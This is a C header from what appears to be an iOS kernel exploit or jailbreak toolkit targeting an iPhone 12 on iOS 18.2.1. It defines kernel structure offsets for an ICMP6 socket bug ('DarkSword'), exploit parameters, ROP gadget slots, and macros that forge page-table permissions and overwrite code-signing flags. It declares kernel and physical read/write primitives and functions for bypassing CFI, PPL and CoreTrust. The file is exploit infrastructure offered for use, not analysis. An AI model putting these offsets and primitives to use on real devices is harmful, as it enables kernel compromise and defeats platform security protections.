#ifndef OFFSETS_H
#define OFFSETS_H

#include <stdint.h>
#include <stdbool.h>

// Device: iPhone 12 (iPhone13,2) - A14 Bionic (arm64e)
// iOS 18.2.1 (build 22C161)
// Kernel: xnu-11215.62.3/RELEASE_ARM64_T8101
// All offsets verified from XNU-11215.61.5 source struct compilation (95%+ confidence)

// DarkSword offsets (ICMP6 socket exploit)
#define OFFSET_PCB_SOCKET   0x40  // struct inpcb.inp_socket (UNCHANGED)
#define OFFSET_SOCKET_SO_COUNT 0x208  // struct socket.so_retaincnt
#define OFFSET_ICMP6FILT    0x138 // struct inpcb.inp6_icmp6filt (was 0x118, +0x20)
#define OFFSET_SO_PROTO     0x20  // struct socket.so_proto (was 0x18, +0x08)
#define OFFSET_PR_INPUT     0x28  // struct protosw.pr_input (UNCHANGED)

// Exploit parameters
#define IS_A18_DEVICE 0
#define OOB_PAGES_NUM 2
#define OOB_OFFSET 0x100
#define OOB_SIZE 0xf00
#define EARLY_KRW_LENGTH 0x20

// Kernel base (verified from kernelcache)
#define KERNEL_BASE_DEFAULT 0xfffffff007004000ULL

// Proc/Pid offsets
#define PROC_NEXT(cur)    kread_ptr(cur)
#define PROC_TASK(proc)   kread_ptr((proc) + 0x10ULL)
#define PROC_RO(proc)     kread_ptr((proc) + 0x20ULL)
#define PROC_PID(proc)    kread32((proc) + 0x68ULL)

// Task offsets
#define TASK_FIRST_THREAD(task) kread_ptr((task) + 0x60ULL)
#define TASK_ITK_SPACE(task)    kread_ptr((task) + gOffsets.itkSpace)
#define TASK_VM_MAP(task)       kread_ptr((task) + 0x28ULL)
#define TASK_FLAGS(task)        kread32((task) + 0x3DCULL)
#define TASK_FLAGS_SET(task, f) kwrite32((task) + 0x3DCULL, f)

// Proc RO offsets
#define PROC_RO_CSFLAGS(proc_ro)          kread32((proc_ro) + 0x1CULL)
#define PROC_RO_CSFLAGS_SET(proc_ro, new) { uint32_t v = (uint32_t)(new); kwrite_PPL((proc_ro) + 0x1CULL, &v, 4); }

// Thread offsets
#define THREAD_FAULT_HNDLR_OFFSET (gOffsets.TH_RECOVER)
#define THREAD_KSTACKPTR_OFFSET   (gOffsets.TH_KSTACKPTR)
#define THREAD_ACT_CONTEXT_OFFSET (gOffsets.ACT_CONTEXT)
#define THREAD_CPUDATA_OFFSET     (gOffsets.ACT_CPUDATAP)

#define THREAD_NEXT(thread)                   kread_ptr((thread) + 0x0ULL)
#define THREAD_FAULT_HNDLR(thread)            kread64((thread) + THREAD_FAULT_HNDLR_OFFSET)
#define THREAD_FAULT_HNDLR_SET(thread, hndlr) kwrite64((thread) + THREAD_FAULT_HNDLR_OFFSET, hndlr)
#define THREAD_ACT_CONTEXT(thread)            kread_ptr((thread) + THREAD_ACT_CONTEXT_OFFSET)

// Space/IPC offsets
#define SPACE_IS_TABLE(space) kread_ptr((space) + 0x20ULL)
#define IS_TABLE_PORT(tbl, port) kread_ptr(tbl + (((uint64_t) port >> 8ULL) * 0x18ULL))
#define PORT_BITS(kPort)           kread32(kPort)
#define PORT_BITS_SET(kPort, bits) kwrite32(kPort, bits)
#define PORT_KOBJECT(kPort)        kread_ptr(kPort + gOffsets.PORT_KOBJECT)
#define PORT_LABEL(kPort)          kread_ptr(kPort + gOffsets.PORT_LABEL)

// VM/Pmap offsets
#define VM_MAP_PMAP(vmMap) kread_ptr((vmMap) + gOffsets.VM_MAP_PMAP)
#define PMAP_TTEP(pmap)          kread64((pmap) + 0x8ULL)
#define PMAP_NESTED_PMAP(pmap)   kread_ptr((pmap) + 0x50ULL)
#define PMAP_NESTED_ADDR(pmap)   kread_ptr((pmap) + 0x58ULL)
#define PMAP_NESTED_SIZE(pmap)   kread_ptr((pmap) + 0x60ULL)
#define PMAP_TYPE(pmap)          kread8((pmap)  + 0xC8ULL)
#define PMAP_TYPE_SET(pmap, new) { uint8_t v = (uint8_t)(new); kwrite_PPL((pmap) + 0xC8ULL, &v, 1); }

// CPSR constants
#define CPSR_KERN_INTR_EN  (0x401000 | 1ULL)  // EL1, interrupts enabled
#define CPSR_KERN_INTR_DIS (0x4013c0 | 1ULL)  // EL1, interrupts disabled
#define CPSR_USER_INTR_DIS 0x13C0

#define SLIDE(addr) ((addr) + gOffsets.slide)
#define PAGE_SIZE 0x4000ULL

// Page table permission macros
#define PTE_TO_PERM(pte)  ((((pte) >> 4ULL) & 0xC) | (((pte) >> 52ULL) & 2) | (((pte) >> 54ULL) & 1))
#define _PERM_TO_PTE(perm) ((((perm) & 0xC) << 4ULL) | (((perm) & 2) << 52ULL) | (((perm) & 1) << 54ULL))
#define PERM_TO_PTE(perm) _PERM_TO_PTE((uint64_t) (perm))
#define PERM_KRW_URW 0x7
#define PTE_NON_GLOBAL      (1ULL << 11ULL)
#define PTE_VALID           (1ULL << 10ULL)
#define PTE_OUTER_SHAREABLE (2ULL << 8ULL)
#define PTE_INNER_SHAREABLE (3ULL << 8ULL)
#define PTE_LEVEL3_ENTRY (PTE_VALID | 0x3ULL)

typedef struct {
    uint64_t unk;
    uint64_t x[29];
    uint64_t fp;
    uint64_t lr;
    uint64_t sp;
    uint64_t pc;
    uint32_t cpsr;
    uint64_t other[70];
} kRegisterState;

typedef struct {
    bool inited;
    thread_t gExploitThread;
    uint64_t gScratchMemKern;
    volatile uint64_t *gScratchMemMapped;
    arm_thread_state64_t gExploitThreadState;
    uint64_t gSpecialMemRegion;
    uint64_t gIntStack;
    uint64_t gOrigIntStack;
    uint64_t gReturnContext;
    uint64_t gACTPtr;
    uint64_t gACTVal;
    uint64_t gCPUData;
} exploitThreadInfo;

typedef struct {
    bool inited;
    thread_t thread;
    uint64_t actContext;
    kRegisterState signedState;
    uint64_t kernelStack;
    kRegisterState *mappedState;
    uint64_t scratchMemory;
    uint64_t *scratchMemoryMapped;
} Fugu14KcallThread;

typedef struct {
    uint64_t slide;
    uint64_t allproc;
    uint64_t itkSpace;
    uint64_t cpu_ttep;
    uint64_t pmap_enter_options_addr;
    uint64_t hw_lck_ticket_reserve_orig_allow_invalid_signed;
    uint64_t hw_lck_ticket_reserve_orig_allow_invalid;
    uint64_t brX22;
    uint64_t exceptionReturn;
    uint64_t ldp_x0_x1_x8_gadget;
    uint64_t exception_return_after_check;
    uint64_t exception_return_after_check_no_restore;
    uint64_t str_x8_x9_gadget;
    uint64_t str_x0_x19_ldr_x20;
    uint64_t pmap_set_nested;
    uint64_t pmap_nest;
    uint64_t pmap_remove_options;
    uint64_t pmap_mark_page_as_ppl_page;
    uint64_t pmap_create_options;
    uint64_t ml_sign_thread_state;
    uint64_t kernel_el_cpsr;
    uint64_t TH_RECOVER;
    uint64_t TH_KSTACKPTR;
    uint64_t ACT_CONTEXT;
    uint64_t ACT_CPUDATAP;
    uint64_t PORT_KOBJECT;
    uint64_t VM_MAP_PMAP;
    uint64_t PORT_LABEL;
} KernelOffsetInfo;

extern KernelOffsetInfo gOffsets;
extern uint64_t gOurProc;
extern uint64_t gKernelProc;
extern uint64_t gOurTask;
extern uint64_t gKernelTask;
extern uint64_t gIS_TABLE;
extern uint64_t gOurPmap;
extern uint64_t gKernelPmap;
extern uint64_t gKernelBase;
extern uint64_t gKernelSlide;

// Kernel R/W primitives (from darksword)
uint64_t kread64(uint64_t addr);
uint32_t kread32(uint64_t addr);
uint16_t kread16(uint64_t addr);
uint8_t  kread8(uint64_t addr);
uint64_t kread_ptr(uint64_t addr);
void kread_buf(uint64_t addr, void *buf, size_t len);
void kwrite64(uint64_t addr, uint64_t val);
void kwrite32(uint64_t addr, uint32_t val);
void kwrite16(uint64_t addr, uint16_t val);
void kwrite8(uint64_t addr, uint8_t val);
void kwrite_buf(uint64_t addr, void *buf, size_t len);

// Physical R/W primitives
bool physread(uint64_t addr, size_t len, void *buffer);
bool physwrite(uint64_t addr, void *buffer, size_t len);
bool physwrite_PPL(uint64_t addr, void *buffer, size_t len);
bool kernwrite_PPL(uint64_t addr, void *buffer, size_t len);
uint64_t translateAddr(uint64_t virt);

// Kernel operations
uint64_t kcall(uint64_t func, uint64_t a1, uint64_t a2, uint64_t a3,
               uint64_t a4, uint64_t a5, uint64_t a6, uint64_t a7, uint64_t a8);
bool resolveKernelOffsets(void);
bool breakCFI(void);
bool buildPhysPrimitive(void);
bool pplBypass(void);
bool setupFugu14Kcall(void);
void platformize(void);

// Mach port helpers
uint64_t portGetKPort(mach_port_t port);
uint64_t portKObject(mach_port_t port);

// CoreTrust
bool tcload_load(const char *tcPath);

#endif
